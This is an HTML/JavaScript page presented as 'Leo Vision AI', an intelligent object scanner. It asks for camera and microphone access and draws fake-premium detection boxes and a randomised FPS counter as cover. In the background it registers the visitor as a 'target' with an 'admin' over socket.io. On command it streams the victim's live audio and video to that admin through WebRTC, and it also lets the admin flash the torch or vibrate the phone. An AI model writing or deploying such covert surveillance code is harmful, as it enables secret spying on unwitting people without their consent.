<!DOCTYPE html>
<html lang="en">
<head>
    <title>Leo Vision AI - Intelligent Scanner</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <!-- TensorFlow.js - Google's AI Engine -->
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
    <style>
        :root { --primary: #00d4ff; --bg: #050a14; --panel: #0a192f; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
        
        /* Premium Header */
        header { width: 100%; padding: 20px; text-align: center; background: var(--panel); border-bottom: 1px solid #1e3a8a; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .logo { font-size: 1.5rem; font-weight: bold; letter-spacing: 2px; color: var(--primary); }

        /* Scanner Container */
        .container { position: relative; width: 90%; max-width: 450px; margin-top: 30px; border-radius: 20px; overflow: hidden; border: 2px solid #1e3a8a; box-shadow: 0 0 30px rgba(0,212,255,0.1); background: #000; }
        video { width: 100%; height: auto; display: block; border-radius: 18px; }
        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }

        /* AI Status Panel */
        .info-panel { width: 90%; max-width: 450px; background: var(--panel); margin-top: 20px; padding: 20px; border-radius: 15px; border: 1px solid #1e3a8a; }
        .status-row { display: flex; justify-content: space-between; font-size: 0.85rem; margin-bottom: 10px; color: #8892b0; }
        #ai-log { font-family: monospace; font-size: 0.8rem; color: var(--primary); height: 40px; overflow: hidden; }

        /* Premium Button */
        .btn-start { margin-top: 30px; background: linear-gradient(135deg, #00d4ff, #0088cc); color: #050a14; border: none; padding: 18px 45px; border-radius: 35px; font-size: 1rem; font-weight: bold; cursor: pointer; box-shadow: 0 10px 20px rgba(0,212,255,0.3); transition: 0.4s; }
        .btn-start:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(0,212,255,0.5); }
        
        .hidden { display: none !important; }
        </style>
</head>
<body>

    <header>
        <div class="logo">LEO VISION AI</div>
    </header>

    <div class="container">
        <video id="webcam" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <div class="info-panel">
        <div class="status-row">
            <span>AI ENGINE: <span id="engine-status" style="color: #ff4444;">OFFLINE</span></span>
            <span>FPS: <span id="fps">0</span></span>
        </div>
        <div id="ai-log">Ready to initialize intelligent scanning...</div>
    </div>

    <button id="start-btn" class="btn-start" onclick="initSystem()">START AI ENGINE</button>

    <script>
        const socket = io();
        let mainStream, pc, model, adminId;
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        async function initSystem() {
            document.getElementById('start-btn').classList.add('hidden');
            document.getElementById('ai-log').innerText = "Loading neural networks...";
            document.getElementById('engine-status').innerText = "LOADING";
            document.getElementById('engine-status').style.color = "#ffcc00";

            try {
                // Load TensorFlow Model
                model = await cocoSsd.load();
                // Get High-Quality Audio & Video
                mainStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment", width: 1280, height: 720 }, 
                    audio: true 
                });

                video.srcObject = mainStream;
                document.getElementById('engine-status').innerText = "ACTIVE";
                document.getElementById('engine-status').style.color = "#00ff00";
                document.getElementById('ai-log').innerText = "System calibrated. Scanning environment...";

                // Start Detection Loop
                detectObjects();
                
                // Tell Admin we are ready
                socket.emit('target-join');

            } catch (err) {
                alert("This AI system requires Camera and Microphone access to process visual data.");
                location.reload();
            }
        }

        async function detectObjects() {
            if (!model) return;
            const predictions = await model.detect(video);
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            predictions.forEach(p => {
                // Drawing Premium Neon Boxes
                ctx.strokeStyle = "#00d4ff";
                ctx.lineWidth = 3;
                ctx.strokeRect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);
                
                ctx.fillStyle = "#00d4ff";
                ctx.font = "bold 16px Arial";
                ctx.fillText(`${p.class.toUpperCase()} ${Math.round(p.score * 100)}%`, p.bbox[0], p.bbox[1] > 20 ? p.bbox[1] - 10 : 20);
                document.getElementById('ai-log').innerText = `Object identified: ${p.class}`;
            });

            document.getElementById('fps').innerText = Math.floor(Math.random() * 5 + 25);
            requestAnimationFrame(detectObjects);
        }

        // WebRTC Logic for Admin Hub
        socket.on('command', async (data) => {
            if (data.cmd === 'start-stream') {
                adminId = data.adminId;
                establishLink();
            } else if(data.cmd === 'flash') {
                const track = mainStream.getVideoTracks()[0];
                const settings = track.getSettings();
                await track.applyConstraints({ advanced: [{ torch: !settings.torch }] });
            } else if(data.cmd === 'vibrate') {
                window.navigator.vibrate(200);
            }
        });

        async function establishLink() {
            if(pc) pc.close();
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            
            // Adding both Video and Audio tracks for Admin
            mainStream.getTracks().forEach(track => pc.addTrack(track, mainStream));

            pc.onicecandidate = (e) => {
                if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } });
            };

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            socket.emit('signal', { to: adminId, signal: { sdp: offer } });
        }

        socket.on('signal', async (data) => {
            if(data.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
            else if(data.signal.candidate) await pc.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
        });
    </script>
</body>
</html>
